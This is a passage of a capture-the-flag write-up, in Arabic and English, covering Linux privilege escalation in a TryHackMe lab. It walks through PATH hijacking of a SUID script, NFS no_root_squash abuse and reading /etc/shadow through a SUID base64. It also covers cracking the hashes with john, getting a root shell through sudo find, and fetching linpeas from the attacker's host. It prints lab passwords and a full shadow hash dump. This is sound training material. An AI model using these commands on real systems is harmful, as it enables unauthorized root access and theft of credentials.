* يمكن استخدام أوامر أخرى غير `bash` مثل `python`, `perl` إذا احتجت ذلك.

---

## 📜 الخلاصة

| العنصر    | التفسير                                                   |
| --------- | --------------------------------------------------------- |
| `$PATH`   | متغير يحدد أماكن البحث عن الأوامر                         |
| الثغرة    | سكربت root يشغل أمر بدون تحديد مساره الكامل               |
| الاستغلال | نضع أمر بنفس الاسم في مجلد قابل للكتابة ونضيفه في `$PATH` |
| النتيجة   | تنفيذ الأمر بصلاحيات `root` وتصبح لديك صلاحية كاملة 🔥    |

---

## ✅ مثال تلخيصي

```bash
export PATH=/tmp:$PATH
cp /bin/bash /tmp/thm
chmod +x /tmp/thm
./path  # سكربت بيستدعي thm بدون مسار كامل
```

> النتيجة: تحصل على Shell بصلاحيات root 👑

---

---
---



on ``murdoch`` user

```
echo $PATH
```

``output``

```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
```

```
ls -l
```

![image](https://github.com/user-attachments/assets/c554eb60-790e-4b6e-83a1-531e67dba6b3)

---

![image](https://github.com/user-attachments/assets/da48da9e-8711-4709-b77b-80dc82f3fbe6)

## 🎯 يعني إيه؟

* السكربت بيحاول يشغّل أمر اسمه ``thm``

* لكن مش كاتب المسار الكامل (زي ``/usr/bin/thm``)

* وده معناه إنه بيعتمد على ``$PATH``

* واللي بيتنفّذ أصلاً من برنامج عليه ``SUID`` (يعني أي أمر جوّاه بيتنفذ بصلاحيات ``root``) 💥




## الخطوة 1: أنشئ سكربت باسم ``thm`` في مجلد قابل للكتابة (زي ``/tmp``)


```
echo '/bin/bash' > /tmp/thm
chmod +x /tmp/thm
```

## ✳️ الخطوة 2: عدل ``$PATH`` علشان يحط ``/tmp`` في البداية

```
export PATH=/tmp:$PATH
```

```
./test
id
```

![image](https://github.com/user-attachments/assets/4a21ee9c-13ad-455e-985c-49aaf767896e)

```
THM-736628929
```

  
</details>








<details>
  <summary>Privilege Escalation: NFS</summary>


```
cat /etc/exports
```

``no_root_squash`` so it's vuln 

![image](https://github.com/user-attachments/assets/f29826d6-da3a-4ad8-83a9-bca6e972939d)

on my device

```
mkdir /tmp/nfs
mount -o rw,vers=3 10.10.189.231:/tmp /tmp/nfs
```

on machine 

```
cp /bin/bash /tmp
```

on my device

```
cp bash /tmp/nfs/rootshell 
```

![image](https://github.com/user-attachments/assets/e0457d3b-53a2-4205-b8a7-574656e5054c)

on machine 

```
/tmp/rootshell -p
```


![image](https://github.com/user-attachments/assets/8d48e5ca-371e-44de-8101-d0c1796f2333)

```
THM-89384012
```

  
</details>












<details>
  <summary>Capstone Challenge</summary>


```
Username: leonard
Password: Penny123
```

---
---

first try to see ``path``

![image](https://github.com/user-attachments/assets/9d15e68e-307b-4da2-b81a-00c4ab68f937)

so it first search on ``/home/leonard/scripts`` ok we will retrun to it 

----

```
getcap -r / 2>/dev/null
```

![image](https://github.com/user-attachments/assets/129ffad7-e101-4fa8-a6a1-6fadf46a4538)


----

```
find / -type f -perm -04000 -ls 2>/dev/null
```

```ruby
16779966   40 -rwsr-xr-x   1 root     root        37360 Aug 20  2019 /usr/bin/base64
17298702   60 -rwsr-xr-x   1 root     root        61320 Sep 30  2020 /usr/bin/ksu
17261777   32 -rwsr-xr-x   1 root     root        32096 Oct 30  2018 /usr/bin/fusermount
17512336   28 -rwsr-xr-x   1 root     root        27856 Apr  1  2020 /usr/bin/passwd
17698538   80 -rwsr-xr-x   1 root     root        78408 Aug  9  2019 /usr/bin/gpasswd
17698537   76 -rwsr-xr-x   1 root     root        73888 Aug  9  2019 /usr/bin/chage
17698541   44 -rwsr-xr-x   1 root     root        41936 Aug  9  2019 /usr/bin/newgrp
17702679  208 ---s--x---   1 root     stapusr    212080 Oct 13  2020 /usr/bin/staprun
17743302   24 -rws--x--x   1 root     root        23968 Sep 30  2020 /usr/bin/chfn
17743352   32 -rwsr-xr-x   1 root     root        32128 Sep 30  2020 /usr/bin/su
17743305   24 -rws--x--x   1 root     root        23880 Sep 30  2020 /usr/bin/chsh
17831141 2392 -rwsr-xr-x   1 root     root      2447304 Apr  1  2020 /usr/bin/Xorg
17743338   44 -rwsr-xr-x   1 root     root        44264 Sep 30  2020 /usr/bin/mount
17743356   32 -rwsr-xr-x   1 root     root        31984 Sep 30  2020 /usr/bin/umount
17812176   60 -rwsr-xr-x   1 root     root        57656 Aug  9  2019 /usr/bin/crontab
17787689   24 -rwsr-xr-x   1 root     root        23576 Apr  1  2020 /usr/bin/pkexec
18382172   52 -rwsr-xr-x   1 root     root        53048 Oct 30  2018 /usr/bin/at
20386935  144 ---s--x--x   1 root     root       147336 Sep 30  2020 /usr/bin/sudo
34469385   12 -rwsr-xr-x   1 root     root        11232 Apr  1  2020 /usr/sbin/pam_timestamp_check
34469387   36 -rwsr-xr-x   1 root     root        36272 Apr  1  2020 /usr/sbin/unix_chkpwd
36070283   12 -rwsr-xr-x   1 root     root        11296 Oct 13  2020 /usr/sbin/usernetctl
35710927   40 -rws--x--x   1 root     root        40328 Aug  9  2019 /usr/sbin/userhelper
38394204  116 -rwsr-xr-x   1 root     root       117432 Sep 30  2020 /usr/sbin/mount.nfs
958368   16 -rwsr-xr-x   1 root     root        15432 Apr  1  2020 /usr/lib/polkit-1/polkit-agent-helper-1
37709347   12 -rwsr-xr-x   1 root     root        11128 Oct 13  2020 /usr/libexec/kde4/kpac_dhcp_helper
51455908   60 -rwsr-x---   1 root     dbus        57936 Sep 30  2020 /usr/libexec/dbus-1/dbus-daemon-launch-helper
17836404   16 -rwsr-xr-x   1 root     root        15448 Apr  1  2020 /usr/libexec/spice-gtk-x86_64/spice-client-glib-usb-acl-helper
18393221   16 -rwsr-xr-x   1 root     root        15360 Oct  1  2020 /usr/libexec/qemu-bridge-helper
37203442  156 -rwsr-x---   1 root     sssd       157872 Oct 15  2020 /usr/libexec/sssd/krb5_child
37203771   84 -rwsr-x---   1 root     sssd        82448 Oct 15  2020 /usr/libexec/sssd/ldap_child
37209171   52 -rwsr-x---   1 root     sssd        49592 Oct 15  2020 /usr/libexec/sssd/selinux_child
37209165   28 -rwsr-x---   1 root     sssd        27792 Oct 15  2020 /usr/libexec/sssd/proxy_child
18270608   16 -rwsr-sr-x   1 abrt     abrt        15344 Oct  1  2020 /usr/libexec/abrt-action-install-debuginfo-to-abrt-cache
18535928   56 -rwsr-xr-x   1 root     root        53776 Mar 18  2020 /usr/libexec/flatpak-bwrap

```


ohhh found ``base64`` again so will try to read ``/etc/shadow``

```
LFILE=/etc/shadow
/usr/bin/base64 "$LFILE" | base64 --decode
```

### booom 

```
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
bin:*:18353:0:99999:7:::
daemon:*:18353:0:99999:7:::
adm:*:18353:0:99999:7:::
lp:*:18353:0:99999:7:::
sync:*:18353:0:99999:7:::
shutdown:*:18353:0:99999:7:::
halt:*:18353:0:99999:7:::
mail:*:18353:0:99999:7:::
operator:*:18353:0:99999:7:::
games:*:18353:0:99999:7:::
ftp:*:18353:0:99999:7:::
nobody:*:18353:0:99999:7:::
pegasus:!!:18785::::::
systemd-network:!!:18785::::::
dbus:!!:18785::::::
polkitd:!!:18785::::::
colord:!!:18785::::::
unbound:!!:18785::::::
libstoragemgmt:!!:18785::::::
saslauth:!!:18785::::::
rpc:!!:18785:0:99999:7:::
gluster:!!:18785::::::
abrt:!!:18785::::::
postfix:!!:18785::::::
setroubleshoot:!!:18785::::::
rtkit:!!:18785::::::
pulse:!!:18785::::::
radvd:!!:18785::::::
chrony:!!:18785::::::
saned:!!:18785::::::
apache:!!:18785::::::
qemu:!!:18785::::::
ntp:!!:18785::::::
tss:!!:18785::::::
sssd:!!:18785::::::
usbmuxd:!!:18785::::::
geoclue:!!:18785::::::
gdm:!!:18785::::::
rpcuser:!!:18785::::::
nfsnobody:!!:18785::::::
gnome-initial-setup:!!:18785::::::
pcp:!!:18785::::::
sshd:!!:18785::::::
avahi:!!:18785::::::
oprofile:!!:18785::::::
tcpdump:!!:18785::::::
leonard:$6$JELumeiiJFPMFj3X$OXKY.N8LDHHTtF5Q/pTCsWbZtO6SfAzEQ6UkeFJy.Kx5C9rXFuPr.8n3v7TbZEttkGKCVj50KavJNAm7ZjRi4/::0:99999:7:::
mailnull:!!:18785::::::
smmsp:!!:18785::::::
nscd:!!:18785::::::
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
```


now we have 2 new hashes for users ``missy`` & ``root``

```
root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51
missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/
```

```
john --session=mycrack missy_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```


missy password

```
Password1
```

![image](https://github.com/user-attachments/assets/5e81d7bd-32e5-409a-8064-bbb89c34bd84)

```
find / -type f -iname '*flag1.txt' 2>/dev/null
```

```
/home/missy/Documents/flag1.txt
```

but i can't crack ``root`` hash

now i'm using ``missy`` user

```
sudo -l
```

![image](https://github.com/user-attachments/assets/ecdb1786-b7aa-4fd1-8dcc-e74f91ea8ef7)

![image](https://github.com/user-attachments/assets/8ad7f29e-ed2c-4b54-851e-c50924aff702)


```
sudo find . -exec /bin/sh \; -quit
```


![image](https://github.com/user-attachments/assets/c57a5b2a-cf19-4b71-9d97-4147be5b1f9f)

```
THM-168824782390238
```


<details>
  <summary>Linpeas⭕</summary>



```
python3 -m http.server 8888
```

```
wget http://<tun0_IP>:8888/linpeas.sh
```

![image](https://github.com/user-attachments/assets/87388684-fe83-4d25-9533-63d565bf2846)

* ![image](https://github.com/user-attachments/assets/dd5a988c-2e00-45a9-ab13-724d737131aa)

* ![image](https://github.com/user-attachments/assets/6a024c09-af8e-4c99-9af7-f5253d9657a8)

* there is alot of ``CVE'S`` you should take look on it

* ![image](https://github.com/user-attachments/assets/8a3dc6e2-d905-4ac9-92cd-625925606858)

* ![image](https://github.com/user-attachments/assets/d4be487b-c6f1-4ff2-bf00-3e68b72526eb)

* ![image](https://github.com/user-attachments/assets/9789c558-6bc6-4ef5-9688-29dc6a149810)

  ![image](https://github.com/user-attachments/assets/ea244bef-6d61-4448-b401-4c288ed3ccbd)

  ![image](https://github.com/user-attachments/assets/fbd04ea8-8113-4aeb-83c3-98ec16c54dee)

  ![image](https://github.com/user-attachments/assets/38859a63-b86a-4382-84a3-4f61462fbfed)


* ![image](https://github.com/user-attachments/assets/69c29eec-c567-4bba-bcea-abe362daebdf)

* ![image](https://github.com/user-attachments/assets/d7cbb3c0-044a-47ce-8991-fc314be89fc5)

* ![image](https://github.com/user-attachments/assets/ce0f7a0c-ae86-4b68-b2a5-900162278670)

* ![image](https://github.com/user-attachments/assets/1a586fe5-0a89-40af-9d17-7ec09de2ee86)

* ![image](https://github.com/user-attachments/assets/6ba0a091-ceb2-44c0-9fd9-41f088799b61)

* ![image](https://github.com/user-attachments/assets/09a00a7e-9dfe-445d-9f16-1e482bb7937a)

* ![image](https://github.com/user-attachments/assets/f5d36712-1cd1-4b03-ba7f-cf591aaaf256)

* ![image](https://github.com/user-attachments/assets/6ad2bbfb-a99d-4b60-a060-701b64f8f7ef)

* ![image](https://github.com/user-attachments/assets/b48eee31-10d4-461c-92c3-04d97ee770d2)

* 
  
</details>


  
</details>
















